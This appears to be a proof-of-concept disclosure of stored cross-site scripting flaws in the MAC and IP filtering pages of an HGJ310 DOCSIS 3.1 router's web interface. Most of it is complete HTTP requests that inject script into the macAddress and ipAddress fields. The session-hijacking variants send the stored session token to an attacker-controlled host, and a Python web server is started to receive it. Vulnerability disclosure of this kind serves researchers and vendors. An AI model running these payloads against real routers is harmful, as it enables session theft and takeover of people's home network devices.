<table border="1">
  <tr>
    <td>Model</td>
    <td>HGJ310</td>
  </tr>
  <tr>
    <td>Technology</td>
    <td>DOCSIS 3.1</td>
  </tr>
  <tr>
    <td>Hardware version</td>
    <td>1.0</td>
  </tr>
  <tr>
    <td>Software version</td>
    <td>BRGCAI 1.0.69</td>
  </tr>
</table>

# Cross Site Scripting - MAC filtering feature

Locate: *Configurações avançadas > Menu > Segurança > Controle de acesso > Filtragem por MAC*

## Stored XSS

Concept Proof:
```
POST /api/v1/service/macFiltering HTTP/1.1
Host: 192.168.0.1
User-Agent: Firefox
Accept: */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Access-Token: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
X-Requested-With: XMLHttpRequest
Content-Length: 60
Connection: close

{"active":true,"macAddress":"<script>alert('xss')</script>"}
```

http://192.168.0.1/#page-security-mac-filtering

[imagem]

## Session Hijacking

Start web server:
```
python3 -m http.server 80
```

Concept Proof:
```
POST /api/v1/service/macFiltering HTTP/1.1
Host: 192.168.0.1
User-Agent: Firefox
Accept: */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Access-Token: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
X-Requested-With: XMLHttpRequest
Content-Length: 122
Connection: close

{"active":true,"macAddress":"<script> new Image().src='http://192.168.0.72/?='+sessionStorage.getItem('token');</script>"}
```

The client accesses and the session token is sent to the attacker:
http://192.168.0.1/#page-security-mac-filtering
[imagem]

Python3 receiving session token:
[imagem]

# Cross Site Scripting - IP filtering feature

Locate: *Configurações avançadas > Menu > Segurança > Controle de acesso > Filtragem por IP*

## Stored XSS

Concept Proof:
```
POST /api/v1/service/portIpFiltering HTTP/1.1
Host: 192.168.0.1
User-Agent: Firefox
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Access-Token: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
X-Requested-With: XMLHttpRequest
Content-Length: 77
Connection: close

{"ipAddress":"<script>alert('xss')</script>","active":true,"protocol":"both"}
```

http://192.168.0.1/#page-security-ip-filtering
[imagem]

## Session Hijacking

Start web server:
```
python3 -m http.server 80
```

Concept Proof:
```
POST /api/v1/service/portIpFiltering HTTP/1.1
Host: 192.168.0.1
User-Agent: Firefox
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Access-Token: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
X-Requested-With: XMLHttpRequest
Content-Length: 139
Connection: close

{"ipAddress":"<script> new Image().src='http://192.168.0.72/?='+sessionStorage.getItem('token');</script>","active":true,"protocol":"both"}
```

The client accesses and the session token is sent to the attacker:
http://192.168.0.1/#page-security-ip-filtering
[imagem]

Python3 receiving session token:
[imagem]